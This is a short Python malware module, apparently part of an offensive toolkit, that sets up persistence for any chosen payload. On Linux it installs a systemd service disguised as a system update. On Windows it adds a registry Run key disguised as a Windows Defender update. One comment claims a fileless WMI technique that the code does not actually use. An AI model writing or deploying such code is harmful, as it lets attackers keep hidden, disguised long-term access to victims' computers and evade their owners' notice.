# --- Module Context: Persistence Engine v2.1 ---
# Purpose: Stealthy system hooks for long-term access.
# -----------------------------------------------
import platform
import os
import subprocess


def install_persistence():
    os_type = platform.system()
    payload = os.path.abspath(input("Absolute Payload Path: "))

    if os_type == "Linux":
        # Masquerades as a core system-update service
        service = f"[Unit]\nDescription=System Update\n[Service]\nExecStart={payload}\nRestart=always\n[Install]\nWantedBy=multi-user.target"
        with open("/etc/systemd/system/sys-update.service", "w") as f:
            f.write(service)
        subprocess.run(
            ["systemctl", "enable", "sys-update.service"], capture_output=True)

    elif os_type == "Windows":
        # Uses 'CommandLineEventConsumer' for fileless-style triggers
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "WindowsDefenderUpdate",
                              0, winreg.REG_SZ, payload)
